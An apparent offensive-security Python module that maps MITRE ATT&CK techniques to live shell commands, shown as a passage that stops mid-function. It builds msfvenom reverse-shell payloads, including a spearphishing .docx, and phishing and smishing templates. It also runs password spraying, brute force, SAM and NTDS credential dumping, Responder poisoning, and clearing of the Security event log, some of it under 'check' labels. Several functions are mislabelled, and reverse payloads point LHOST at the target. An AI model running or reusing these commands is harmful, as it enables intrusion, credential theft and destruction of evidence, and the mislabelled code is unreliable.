#!/usr/bin/env python3
"""
MITRE ATT&CK Module - Enterprise Attack Coverage
BlackSentinel Strike

Complete coverage of MITRE ATT&CK Enterprise framework.
All 15 tactics with mapped techniques.

For authorized security testing only.
"""

import subprocess


class MITREAttack:
    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}

    def run_command(self, cmd, timeout=30):
        """Execute command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return f"[!] Command timed out after {timeout}s"
        except Exception as e:
            return f"[!] Error: {str(e)}"

    def log(self, msg):
        if self.callback:
            self.callback(msg)

    # =========================================================================
    # TA0043 - Reconnaissance
    # =========================================================================

    def T1595_001_active_scanning_ip(self, target):
        self.log(f"[*] T1595.001: Active IP scanning on {target}")
        output = self.run_command(f"nmap -sn {target} -oG -")
        self.results["T1595_001"] = output
        return output

    def T1595_002_active_scanning_port(self, target):
        self.log(f"[*] T1595.002: Port scanning {target}")
        output = self.run_command(f"nmap -sS -sV -O {target} -oN /tmp/nmap_scan.txt", timeout=120)
        self.results["T1595_002"] = output
        return output

    def T1595_003_active_scanning_wordlist(self, target):
        self.log(f"[*] T1595.003: Directory brute force on {target}")
        output = self.run_command(
            f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 20 -q --no-error", timeout=60
        )
        self.results["T1595_003"] = output
        return output

    def T1592_001_gather_hardware(self, target):
        self.log(f"[*] T1592.001: Hardware enumeration on {target}")
        output = self.run_command(f"nmap -sV --script=banner {target}", timeout=60)
        self.results["T1592_001"] = output
        return output

    def T1592_002_gather_software(self, target):
        self.log(f"[*] T1592.002: Software enumeration on {target}")
        output = self.run_command(f"nmap --script=http-enum,http-server-header {target}", timeout=60)
        self.results["T1592_002"] = output
        return output

    def T1592_003_gather_firmware(self, target):
        self.log(f"[*] T1592.003: Firmware fingerprinting on {target}")
        output = self.run_command(f"nmap --script=ssl-cert,ssh2-enum-algos {target}", timeout=60)
        self.results["T1592_003"] = output
        return output

    def T1589_001_gather_identity(self, target):
        self.log(f"[*] T1589.001: Credential harvesting from OSINT for {target}")
        output = self.run_command(f"theharvester -d {target} -b all -l 200 -f /tmp/harvester_{target}.html", timeout=60)
        self.results["T1589_001"] = output
        return output

    def T1589_002_gather_email(self, target):
        self.log(f"[*] T1589.002: Email enumeration for {target}")
        output = self.run_command(f"theharvester -d {target} -b google,bing,linkedin -l 100", timeout=60)
        self.results["T1589_002"] = output
        return output

    def T1589_003_gather_employee(self, target):
        self.log(f"[*] T1589.003: Employee enumeration via LinkedIn for {target}")
        output = self.run_command(f"linkedin2username -c '{target}' -o /tmp/linkedin_{target}.csv", timeout=60)
        self.results["T1589_003"] = output
        return output

    def T1591_001_gather_org(self, target):
        self.log(f"[*] T1591.001: Physical location gathering for {target}")
        output = self.run_command(
            f"curl -s 'https://ipinfo.io/{target}/json' 2>/dev/null || echo 'Could not resolve IP info'"
        )
        self.results["T1591_001"] = output
        return output

    def T1591_002_gather_business_relations(self, target):
        self.log(f"[*] T1591.002: Business relationship mapping for {target}")
        output = self.run_command(f"whois {target} 2>/dev/null | head -50", timeout=30)
        self.results["T1591_002"] = output
        return output

    def T1598_001_phishing_for_info(self, target):
        self.log(f"[*] T1598.001: Generating phishing payload template for {target}")
        payload = (
            f"Phishing template generated for target: {target}\n"
            f"Subject: Urgent Security Update Required\n"
            f"From: it-support@{target}\n"
            f"Body: Please verify your credentials at the link below.\n"
        )
        self.results["T1598_001"] = payload
        return payload

    def T1598_002_phishing_attachment(self, target):
        self.log(f"[*] T1598.002: Creating malicious document template for {target}")
        payload_info = f"Reverse handler started for {target} - waiting for connection"
        self.results["T1598_002"] = payload_info
        return payload_info

    # =========================================================================
    # TA0042 - Resource Development
    # =========================================================================

    def T1583_001_acquire_infrastructure_domains(self, target):
        self.log(f"[*] T1583.001: Domain reconnaissance for {target}")
        output = self.run_command(f"dig {target} ANY +noall +answer; nslookup {target}")
        self.results["T1583_001"] = output
        return output

    def T1583_002_acquire_infrastructure_dns(self, target):
        self.log(f"[*] T1583.002: DNS enumeration for {target}")
        output = self.run_command(f"host -t NS {target}; host -t MX {target}; host -t SOA {target}")
        self.results["T1583_002"] = output
        return output

    def T1583_003_acquire_infrastructure_vps(self, target):
        self.log(f"[*] T1583.003: VPS/cloud metadata check for {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-methods,http-title {target}", timeout=30)
        self.results["T1583_003"] = output
        return output

    def T1584_001_compromise_accounts(self, target):
        self.log(f"[*] T1584.001: Subdomain brute force on {target}")
        output = self.run_command(f"subfinder -d {target} -silent -o /tmp/subdomains_{target}.txt", timeout=60)
        self.results["T1584_001"] = output
        return output

    def T1584_002_compromise_server(self, target):
        self.log(f"[*] T1584.002: DNS zone transfer attempt on {target}")
        ns_result = self.run_command(f"dig +short NS {target} 2>/dev/null").strip()
        ns = ns_result.split("\n")[0] if ns_result else target
        output = self.run_command(f"dig axfr {target} @{ns} 2>/dev/null || echo 'Zone transfer refused'")
        self.results["T1584_002"] = output
        return output

    def T1585_001_create_accounts(self, target):
        self.log(f"[*] T1585.001: Social media account recon for {target}")
        output = self.run_command(f"sherlock {target} --timeout 15 2>/dev/null || echo 'sherlock not installed'")
        self.results["T1585_001"] = output
        return output

    def T1586_001_compromise_accounts_social(self, target):
        self.log(f"[*] T1586.001: Password spray against {target} web services")
        output = self.run_command(
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-get / -t 4 -f 2>/dev/null | head -20",
            timeout=60,
        )
        self.results["T1586_001"] = output
        return output

    def T1588_001_obtain_capabilities(self, target):
        self.log(f"[*] T1588.001: Payload generation for {target}")
        output = self.run_command(
            f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o /tmp/payload.exe 2>&1"
        )
        self.results["T1588_001"] = output
        return output

    def T1588_002_obtain_tool(self, target):
        self.log(f"[*] T1588.002: Tool availability check for {target}")
        tools = ["nmap", "hydra", "nikto", "sqlmap", "msfconsole", "gobuster", "ffuf"]
        output = ""
        for tool in tools:
            result = self.run_command(f"which {tool} 2>/dev/null")
            status = "Available" if result.strip() and "Error" not in result else "Not Found"
            output += f"{tool}: {status}\n"
        self.results["T1588_002"] = output
        return output

    def T1588_003_obtain_signed_binary(self, target):
        self.log(f"[*] T1588.003: Checking signing certificates for {target}")
        output = self.run_command(
            f"openssl s_client -connect {target}:443 -showcerts </dev/null 2>/dev/null | "
            f"openssl x509 -noout -text 2>/dev/null | grep -E 'Issuer|Subject|Not Before|Not After'"
        )
        self.results["T1588_003"] = output
        return output

    def T1588_004_obtain_exploits(self, target):
        self.log(f"[*] T1588.004: Searching for known exploits on {target}")
        output = self.run_command(f"searchsploit {target} 2>/dev/null | head -30 || echo 'searchsploit not available'")
        self.results["T1588_004"] = output
        return output

    def T1608_001_stage_capabilities(self, target):
        self.log(f"[*] T1608.001: Preparing staged capabilities for {target}")
        output = self.run_command(
            f"msfvenom -p php/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f raw -o /tmp/stage.php 2>&1"
        )
        self.results["T1608_001"] = output
        return output

    # =========================================================================
    # TA0001 - Initial Access
    # =========================================================================

    def T1189_drive_by_compromise(self, target):
        self.log(f"[*] T1189: Drive-by compromise scan on {target}")
        output = self.run_command(
            f"nikto -h http://{target} -Tuning x6 -Format txt -o /tmp/nikto_{target}.txt", timeout=120
        )
        self.results["T1189"] = output
        return output

    def T1190_exploit_public_facing(self, target):
        self.log(f"[*] T1190: Exploiting public-facing app on {target}")
        output = self.run_command(
            f"nmap -p 80,443,8080,8443 --script=http-shellshock,http-vuln-cve2017-5638,ssl-heartbleed {target}",
            timeout=120,
        )
        self.results["T1190"] = output
        return output

    def T1133_external_remote_services(self, target):
        self.log(f"[*] T1133: Brute forcing remote services on {target}")
        output = self.run_command(
            f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt "
            f"-P /usr/share/wordlists/rockyou.txt {target} ssh -t 4 -f 2>/dev/null | tail -20",
            timeout=120,
        )
        self.results["T1133"] = output
        return output

    def T1200_hardware_additions(self, target):
        self.log(f"[*] T1200: Scanning for new devices on network segment of {target}")
        output = self.run_command(f"nmap -sn {target}/24 --open -oG - 2>/dev/null | grep 'Up'", timeout=60)
        self.results["T1200"] = output
        return output

    def T1566_001_phishing_spear_attach(self, target):
        self.log(f"[*] T1566.001: Creating spearphishing attachment for {target}")
        output = self.run_command(
            f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f docx -o /tmp/spear.docx 2>&1"
        )
        self.results["T1566_001"] = output
        return output

    def T1566_002_phishing_spear_link(self, target):
        self.log(f"[*] T1566.002: Generating credential harvesting page for {target}")
        harvest_info = f"Credential harvest page template ready for {target}"
        self.results["T1566_002"] = harvest_info
        return harvest_info

    def T1566_003_phishing_spear_via_service(self, target):
        self.log(f"[*] T1566.003: SMishing template for {target}")
        payload = f"SMS phishing template for {target}\nMessage: Your account has been compromised. Verify at http://{target}/verify"
        self.results["T1566_003"] = payload
        return payload

    def T1078_valid_accounts(self, target):
        self.log(f"[*] T1078: Password spraying on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
            f"-p 'Password123!' --continue-on-success 2>/dev/null | grep '+' | head -20",
            timeout=60,
        )
        self.results["T1078"] = output
        return output

    def T1195_001_supply_chain_hardware(self, target):
        self.log(f"[*] T1195.001: Checking {target} for vulnerable dependencies")
        output = self.run_command(f"sslscan {target}:443 2>/dev/null || echo 'sslscan not available'")
        self.results["T1195_001"] = output
        return output

    def T1195_002_supply_chain_software(self, target):
        self.log(f"[*] T1195.002: Checking {target} for exposed build systems")
        output = self.run_command(
            f"nmap -p 80,443,8080,8443,3000,5000 --script=http-title,http-enum {target}", timeout=60
        )
        self.results["T1195_002"] = output
        return output

    # =========================================================================
    # TA0002 - Execution
    # =========================================================================

    def T1059_001_powershell(self, target):
        self.log(f"[*] T1059.001: PowerShell execution test on {target}")
        output = self.run_command(f"nmap -p 5985,5986 --script=http-winrm-info {target}", timeout=30)
        self.results["T1059_001"] = output
        return output

    def T1059_002_unix_shell(self, target):
        self.log(f"[*] T1059.002: SSH command execution on {target}")
        output = self.run_command(
            f"ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@{target} 'id; uname -a' 2>&1 | head -20",
            timeout=15,
        )
        self.results["T1059_002"] = output
        return output

    def T1059_003_windows_cmd(self, target):
        self.log(f"[*] T1059.003: Testing command execution via SMB on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'whoami' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1059_003"] = output
        return output

    def T1059_004_unix_script(self, target):
        self.log(f"[*] T1059.004: Banner grabbing from {target}")
        output = self.run_command(f"nmap -sV --script=banner -p 21,22,25,80,443 {target}", timeout=30)
        self.results["T1059_004"] = output
        return output

    def T1059_005_visual_basic(self, target):
        self.log(f"[*] T1059.005: Checking for VBA macros via SMB on {target}")
        output = self.run_command(f"smbclient -L {target} -N 2>/dev/null || echo 'SMB not accessible'", timeout=15)
        self.results["T1059_005"] = output
        return output

    def T1059_006_python(self, target):
        self.log(f"[*] T1059.006: Checking for Python web apps on {target}")
        output = self.run_command(f"nmap -p 8000,8080,5000,9000 --script=http-title {target}", timeout=30)
        self.results["T1059_006"] = output
        return output

    def T1059_007_javascript(self, target):
        self.log(f"[*] T1059.007: Detecting Node.js apps on {target}")
        output = self.run_command(f"nmap -p 3000,8080,8443 --script=http-enum,http-title {target}", timeout=30)
        self.results["T1059_007"] = output
        return output

    def T1059_008_network_device(self, target):
        self.log(f"[*] T1059.008: Network device CLI access on {target}")
        output = self.run_command(f"nmap -p 23,22,161 --script=ssh2-enum-algos,snmp-info {target}", timeout=30)
        self.results["T1059_008"] = output
        return output

    def T1053_003_cron(self, target):
        self.log(f"[*] T1053.003: Checking for cron-based persistence on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'cat /etc/crontab 2>/dev/null || schtasks /query' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1053_003"] = output
        return output

    def T1059_009_cloud_api(self, target):
        self.log(f"[*] T1059.009: Cloud API endpoint detection on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-cloudmeta,http-headers {target}", timeout=30)
        self.results["T1059_009"] = output
        return output

    def T1047_windows_mgmt_instrumentation(self, target):
        self.log(f"[*] T1047: WMI execution check on {target}")
        output = self.run_command(f"nmap -p 135 --script=msrpc-enum {target}", timeout=30)
        self.results["T1047"] = output
        return output

    def T1053_005_scheduled_task(self, target):
        self.log(f"[*] T1053.005: Scheduled task enumeration on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'schtasks /query /fo LIST' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1053_005"] = output
        return output

    def T1203_exploitation_for_client_exec(self, target):
        self.log(f"[*] T1203: Client-side exploitation test on {target}")
        output = self.run_command(f"nikto -h {target} -Tuning 4 -timeout 5 2>/dev/null | head -30", timeout=60)
        self.results["T1203"] = output
        return output

    # =========================================================================
    # TA0003 - Persistence
    # =========================================================================

    def T1098_account_manipulation(self, target):
        self.log(f"[*] T1098: Account manipulation check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --pass-pol 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1098"] = output
        return output

    def T1136_create_account(self, target):
        self.log(f"[*] T1136: Checking for create account capabilities on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M groupenum 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1136"] = output
        return output

    def T1543_001_systemd_service(self, target):
        self.log(f"[*] T1543.001: Systemd service persistence check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'systemctl list-unit-files --type=service' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1543_001"] = output
        return output

    def T1543_003_windows_service(self, target):
        self.log(f"[*] T1543.003: Windows service persistence check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'sc query type= service state= all | findstr SERVICE_NAME' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1543_003"] = output
        return output

    def T1546_003_windows_event_hooking(self, target):
        self.log(f"[*] T1546.003: Event hooking check on {target}")
        output = self.run_command(f"nmap -p 445,139 --script=smb-os-discovery,smb-enum-shares {target}", timeout=30)
        self.results["T1546_003"] = output
        return output

    def T1547_001_registry_run_keys(self, target):
        self.log(f"[*] T1547.001: Registry run key persistence check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1547_001"] = output
        return output

    def T1547_009_shortcut_modification(self, target):
        self.log(f"[*] T1547.009: Shortcut modification persistence on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'dir C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1547_009"] = output
        return output

    def T1574_hijack_execution_flow(self, target):
        self.log(f"[*] T1574: DLL hijacking check on {target}")
        output = self.run_command(f"nmap -p 445,139 --script=smb-enum-shares {target}", timeout=30)
        self.results["T1574"] = output
        return output

    def T1505_003_web_shell(self, target):
        self.log(f"[*] T1505.003: Web shell detection on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-shellshock,http-webshell {target}", timeout=60)
        self.results["T1505_003"] = output
        return output

    # =========================================================================
    # TA0004 - Privilege Escalation
    # =========================================================================

    def T1068_exploitation_for_privilege_escalation(self, target):
        self.log(f"[*] T1068: Privilege escalation exploitation on {target}")
        output = self.run_command(f"nmap -p 445,139 --script=smb-vuln-ms17-010,smb-vuln-ms08-067 {target}", timeout=120)
        self.results["T1068"] = output
        return output

    def T1055_process_injection(self, target):
        self.log(f"[*] T1055: Process injection check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'tasklist /v' 2>/dev/null | head -20 || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1055"] = output
        return output

    def T1134_access_token_manipulation(self, target):
        self.log(f"[*] T1134: Token manipulation check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'whoami /priv' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1134"] = output
        return output

    def T1548_002_bypass_uac(self, target):
        self.log(f"[*] T1548.002: UAC bypass check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System /v EnableLUA' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1548_002"] = output
        return output

    def T1059_001_powershell_privesc(self, target):
        self.log(f"[*] T1059.001: PowerShell privilege escalation check on {target}")
        output = self.run_command(f"nmap -p 5985,5986 --script=http-winrm-info {target}", timeout=30)
        self.results["T1059_001_privesc"] = output
        return output

    def T1484_domain_policy_modification(self, target):
        self.log(f"[*] T1484: Domain policy modification check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --pass-pol 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1484"] = output
        return output

    # =========================================================================
    # TA0005 - Defense Evasion
    # =========================================================================

    def T1027_obfuscated_files(self, target):
        self.log(f"[*] T1027: Obfuscated file detection on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-malware-host,http-title {target}", timeout=30)
        self.results["T1027"] = output
        return output

    def T1036_masquerading(self, target):
        self.log(f"[*] T1036: Masquerading check on {target}")
        output = self.run_command(f"nmap -sV --script=banner,http-title -p 80,443 {target}", timeout=30)
        self.results["T1036"] = output
        return output

    def T1070_indicator_removal(self, target):
        self.log(f"[*] T1070: Indicator removal check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'wevtutil cl Security 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1070"] = output
        return output

    def T1112_modify_registry(self, target):
        self.log(f"[*] T1112: Registry modification check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'reg query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1112"] = output
        return output

    def T1140_deobfuscate_decode(self, target):
        self.log(f"[*] T1140: Deobfuscation check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-enum,http-headers {target}", timeout=30)
        self.results["T1140"] = output
        return output

    def T1202_indirect_command_execution(self, target):
        self.log(f"[*] T1202: Indirect command execution check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'where certutil 2>nul && where mshta 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1202"] = output
        return output

    def T1218_011_rundll32(self, target):
        self.log(f"[*] T1218.011: Rundll32 abuse check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'tasklist /m rundll32.dll 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1218_011"] = output
        return output

    def T1221_template_injection(self, target):
        self.log(f"[*] T1221: Template injection check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-title,http-enum {target}", timeout=30)
        self.results["T1221"] = output
        return output

    def T1497_virtualization_sandbox_evasion(self, target):
        self.log(f"[*] T1497: VM/sandbox evasion check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-user-agent {target}", timeout=30)
        self.results["T1497"] = output
        return output

    def T1056_001_keylogging(self, target):
        self.log(f"[*] T1056.001: Keylogger detection on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'tasklist | findstr /i key' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1056_001"] = output
        return output

    # =========================================================================
    # TA0112 - Credential Access
    # =========================================================================

    def T1003_001_lsass_memory(self, target):
        self.log(f"[*] T1003.001: LSASS memory dump attempt on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'reg save HKLM\\\\SYSTEM C:\\\\temp\\\\system.hiv 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1003_001"] = output
        return output

    def T1003_002_security_account_manager(self, target):
        self.log(f"[*] T1003.002: SAM database dump attempt on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'reg save HKLM\\\\SAM C:\\\\temp\\\\sam.hiv 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1003_002"] = output
        return output

    def T1003_003_ntds(self, target):
        self.log(f"[*] T1003.003: NTDS.dit extraction attempt on {target}")
        output = self.run_command(
            f"secretsdump.py {target} 2>/dev/null || echo 'Impacket not available - manual extraction required'",
            timeout=60,
        )
        self.results["T1003_003"] = output
        return output

    def T1110_brute_force(self, target):
        self.log(f"[*] T1110: Brute force attack on {target}")
        output = self.run_command(
            f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt {target} ssh -t 4 -f 2>/dev/null | tail -10",
            timeout=120,
        )
        self.results["T1110"] = output
        return output

    def T1558_003_kerberoasting(self, target):
        self.log(f"[*] T1558.003: Kerberoasting attempt on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M kerberoast 2>/dev/null || echo 'SMB/Kerberos not accessible'", timeout=60
        )
        self.results["T1558_003"] = output
        return output

    def T1557_001_llmnr_nbt_ns(self, target):
        self.log(f"[*] T1557.001: LLMNR/NBT-NS poisoning check on {target}")
        output = self.run_command(
            "responder -I eth0 -wrf 2>/dev/null & echo 'Responder started - check for captured hashes' || echo 'Responder not available'",
            timeout=10,
        )
        self.results["T1557_001"] = output
        return output

    def T1555_credentials_from_password_store(self, target):
        self.log(f"[*] T1555: Password store extraction on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'dir /s C:\\\\Users\\\\*\\\\*password* 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1555"] = output
        return output

    def T1552_001_credentials_in_files(self, target):
        self.log(f"[*] T1552.001: Credentials in files check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'findstr /si password *.txt *.ini *.config 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1552_001"] = output
        return output

    def T1552_006_group_policy_preferences(self, target):
        self.log(f"[*] T1552.006: Group Policy Preferences credential check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M gpp_password 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1552_006"] = output
        return output

    # =========================================================================
    # TA0007 - Discovery
    # =========================================================================

    def T1046_network_service_discovery(self, target):
        self.log(f"[*] T1046: Network service discovery on {target}")
        output = self.run_command(f"nmap -sV -sC -p- --open {target}", timeout=300)
        self.results["T1046"] = output
        return output

    def T1018_remote_system_discovery(self, target):
        self.log(f"[*] T1018: Remote system discovery on {target}")
        output = self.run_command(f"nmap -sn {target}/24 -oG - 2>/dev/null | grep 'Up'", timeout=60)
        self.results["T1018"] = output
        return output

    def T1082_system_info_discovery(self, target):
        self.log(f"[*] T1082: System information discovery on {target}")
        output = self.run_command(
            f"nmap -sV --script=banner,http-title -p 21,22,23,80,443,445,3389 {target}", timeout=30
        )
        self.results["T1082"] = output
        return output

    def T1083_file_and_dir_discovery(self, target):
        self.log(f"[*] T1083: File and directory discovery on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-enum {target}", timeout=60)
        self.results["T1083"] = output
        return output

    def T1016_system_network_config(self, target):
        self.log(f"[*] T1016: System network configuration discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'ipconfig /all' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1016"] = output
        return output

    def T1049_system_network_connections(self, target):
        self.log(f"[*] T1049: System network connections discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'netstat -ano' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1049"] = output
        return output

    def T1033_system_owner_user_discovery(self, target):
        self.log(f"[*] T1033: System owner/user discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'whoami /all' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1033"] = output
        return output

    def T1069_permission_groups_discovery(self, target):
        self.log(f"[*] T1069: Permission groups discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M groupenum 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1069"] = output
        return output

    def T1057_process_discovery(self, target):
        self.log(f"[*] T1057: Process discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'tasklist /v' 2>/dev/null | head -20 || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1057"] = output
        return output

    def T1087_account_discovery(self, target):
        self.log(f"[*] T1087: Account discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M smb-enum 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1087"] = output
        return output

    def T1482_domain_trust_discovery(self, target):
        self.log(f"[*] T1482: Domain trust discovery on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M domain-trusts 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1482"] = output
        return output

    def T1614_system_location_discovery(self, target):
        self.log(f"[*] T1614: System location discovery on {target}")
        output = self.run_command(f"curl -s 'https://ipinfo.io/{target}/json' 2>/dev/null || echo 'Could not resolve'")
        self.results["T1614"] = output
        return output

    def T1010_application_window_discovery(self, target):
        self.log(f"[*] T1010: Application window discovery on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-title,http-methods {target}", timeout=30)
        self.results["T1010"] = output
        return output

    # =========================================================================
    # TA0006 - Lateral Movement
    # =========================================================================

    def T1021_remote_services(self, target):
        self.log(f"[*] T1021: Remote services lateral movement on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -u admin -p '' --shares 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1021"] = output
        return output

    def T1021_001_rdp(self, target):
        self.log(f"[*] T1021.001: RDP lateral movement check on {target}")
        output = self.run_command(f"nmap -p 3389 --script=rdp-enum-encryption {target}", timeout=30)
        self.results["T1021_001"] = output
        return output

    def T1021_002_smb_admin(self, target):
        self.log(f"[*] T1021.002: SMB lateral movement on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --shares -u admin -p '' 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1021_002"] = output
        return output

    def T1021_003_dcom(self, target):
        self.log(f"[*] T1021.003: DCOM lateral movement on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M dcom_exec -o ACTION=TEST 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1021_003"] = output
        return output

    def T1021_006_windows_remote_mgmt(self, target):
        self.log(f"[*] T1021.006: WinRM lateral movement on {target}")
        output = self.run_command(f"nmap -p 5985,5986 --script=http-winrm-info {target}", timeout=30)
        self.results["T1021_006"] = output
        return output

    def T1570_lateral_tool_transfer(self, target):
        self.log(f"[*] T1570: Lateral tool transfer check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --shares 2>/dev/null | grep -i 'READ\\|WRITE' || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1570"] = output
        return output

    def T1550_002_silver_ticket(self, target):
        self.log(f"[*] T1550.002: Pass the Hash on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --pass-the-hash -u Administrator -H '' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1550_002"] = output
        return output

    def T1550_003_pass_the_ticket(self, target):
        self.log(f"[*] T1550.003: Pass the Ticket check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M kerberoast 2>/dev/null || echo 'SMB/Kerberos not accessible'", timeout=30
        )
        self.results["T1550_003"] = output
        return output

    def T1563_remote_service_session_hijacking(self, target):
        self.log(f"[*] T1563: Remote service session hijacking on {target}")
        output = self.run_command(f"nmap -p 22,23,3389,5985 --script=ssh2-enum-algos {target}", timeout=30)
        self.results["T1563"] = output
        return output

    # =========================================================================
    # TA0009 - Collection
    # =========================================================================

    def T1005_data_from_local_system(self, target):
        self.log(f"[*] T1005: Data collection from local system on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --shares 2>/dev/null || echo 'SMB not accessible'", timeout=30
        )
        self.results["T1005"] = output
        return output

    def T1039_data_from_network_shared_drive(self, target):
        self.log(f"[*] T1039: Data from network shared drive on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -M spider_plus 2>/dev/null || echo 'SMB not accessible'", timeout=60
        )
        self.results["T1039"] = output
        return output

    def T1074_001_data_staged_local(self, target):
        self.log(f"[*] T1074.001: Local data staging on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'dir C:\\\\temp\\\\*.zip 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1074_001"] = output
        return output

    def T1074_002_data_staged_remote(self, target):
        self.log(f"[*] T1074.002: Remote data staging on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --shares 2>/dev/null | grep -i 'READ\\|WRITE' || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1074_002"] = output
        return output

    def T1119_automatic_collection(self, target):
